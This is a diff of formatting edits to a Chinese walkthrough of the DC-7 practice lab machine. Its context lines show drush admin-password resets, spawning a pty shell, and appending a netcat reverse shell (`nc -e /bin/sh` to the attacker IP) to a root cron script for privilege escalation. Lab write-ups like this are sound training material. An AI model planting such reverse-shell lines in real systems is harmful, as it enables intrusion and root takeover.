@@ -7,7 +7,6 @@ tags:
   - 渗透测试
 category: 靶场&靶机
 ---
-
 # DC-7复现
 
 ## 描述
@@ -76,7 +75,7 @@ ssh dc7user@192.168.71.129
 
 ![image-20221201094354750](./images/image-20221201094354750.png)
 
-在当前目录下，发现了两个文件夹**backups**和**mbox**，其中backups是有两个gpg结尾的文件，经过查阅得知这是一种加密文件的后缀；在mbox里记录着root的定时任务，其项目位于`/opt/scripts/backups.sh`
+在当前目录下，发现了两个文件夹**backups**和**mbox**，其中backups是有两个gpg结尾的文件，经过查阅得知这是一种加密文件的后缀；在mbox里记录着root的定时任务，其项目位于 `/opt/scripts/backups.sh`
 
 ![image-20221201095704000](./images/image-20221201095704000.png)
 
@@ -98,7 +97,7 @@ ssh dc7user@192.168.71.129
 
 drush部分命令：
 
-```
+```txt
 查看用户信息
 drush user-information admin	//查询是否存在admin
 修改密码
@@ -129,7 +128,7 @@ admin密码修改成功
 
 下载地址：
 
-```url
+```txt
 https://ftp.drupal.org/files/projects/php-8.x-1.x-dev.tar.gz
 ```
 
@@ -159,7 +158,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'	//交互式shell
 
 之前的提权方式都用不了，就只能换个思路，前面提到想用**backups.sh**进行反弹shell，发现www-data用户是有写入的权限的，那就同理利用其进行提权
 
-可以直接在蚁剑里找到backups.sh直接加上`nc -e /bin/sh 192.168.71.128 1234`
+可以直接在蚁剑里找到backups.sh直接加上 `nc -e /bin/sh 192.168.71.128 1234`
 
 ![image-20221201144758579](./images/image-20221201144758579.png)
 
